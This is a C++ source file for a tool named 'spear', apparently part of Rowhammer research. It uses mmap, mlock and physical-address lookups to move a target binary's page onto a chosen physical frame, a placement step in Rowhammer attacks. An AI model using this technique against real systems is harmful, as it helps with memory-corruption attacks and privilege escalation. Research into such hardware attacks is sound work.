#include "libhammer.h"

using namespace std;

uint64_t target_pa, mem_size, target_offset = 0;
char *memfile, *target, *l, *r;
int fd;

void alloc()
{
    mem_size = get_mem_size();
    cout << "- mem size: " << dec << (mem_size>>20) << " M" << endl;

    ASSERT(-1 != (fd = open("memfile", O_RDONLY)) );
    memfile = mmap(0, mem_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0);
}

void access()
{
    volatile uint64_t tmp = 0;
    uint64_t i=0, pa;

    cout << "access..." << endl;
    for (i=0; i<mem_size; i+=PAGE_SIZE)
    {
        tmp += memfile[i];

        if (i>0 && i % (1<<24)==0) { cout << "."; cout.flush(); }
        if (i>0 && i % (1<<30)==0) cout << dec <<(i>>30) << "G" << endl;

        pa = v2p(memfile+i);
        if (pa == target_pa)
        {
            target_offset = i;
            cout << endl << hex << "- find va=" << (uint64_t)(memfile+i) << " pa=" << pa << endl;
            // 1. mlock() target page
            mlock(memfile+i, PAGE_SIZE);
        }
    }
    cout << endl;
}

void manipulate()
{
    volatile uint64_t tmp = 0;
    int64_t i, rsize;
    // 2. assuming the target page is INACTIVE but UNEVICTABLE (mlock-ed)
    //    cancel the original (whole) mapping
    munmap(memfile, mem_size); memfile = 0;
    rsize = mem_size - (target_offset + PAGE_SIZE);

    // 3. map the memfile again, this time in 3 parts
    target = mmap(0, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, target_offset);
    l = mmap(0, target_offset, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0);

   // r = mmap(0, rsize, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, target_offset + PAGE_SIZE);
   // cout << "- accessing right..." << endl;
   // for (i=0; i<rsize; i+=PAGE_SIZE)
   //     tmp += r[i];

    cout << "- accessing left..." << endl;
    for (i=0; i<target_offset/4; i+=PAGE_SIZE)
        tmp += l[i];

    // 4. at this time the target page is still mlock-ed. use the code below can check its pa == target_pa
    // tmp += target[0]; cout << "+ target: " << hex << v2p(target) << endl;

    // 5. unlock the page
    cout << "- unlock target" << endl;
    munlock(target, PAGE_SIZE);
    munmap(target, PAGE_SIZE); target = 0;
}

void cleanup()
{
    cout << "- cleanup..." << endl;
    close(fd);
    if (memfile)
    {
        munmap(memfile, mem_size); memfile = 0;
    }
    if (target)
    {
        munmap(target, PAGE_SIZE); target = 0;
    }
    if (l)
    {
        munmap(l, target_offset); l = 0;
    }
    if (r)
    {
        munmap(r, mem_size - (target_offset + PAGE_SIZE)); r = 0;
    }
}

int main(int argc, char **argv)
{
    if (argc < 3)
    {
        cout << "usage: spear [path] [paddr]" << endl;
        return 0;
    }

    string fname(argv[1]);
    stringstream ss;
    ss << hex << argv[2]; ss >> target_pa;
   // cout << "CHILD_MAX = " << sysconf(_SC_CHILD_MAX) << endl;
    cout << "path: " << fname << ", pa=" << hex << get_binary_pa(fname) << " target paddr=" << target_pa << endl;

    // equivalent to waylaying
    alloc();
    access();
    // magic!
    if (target_offset)
        manipulate();

    cout << "---" << endl;
    cout << "path: " << fname << ", pa=" << hex << get_binary_pa(fname) << " target paddr=" << target_pa << endl;

    cleanup();

    return 0;
}
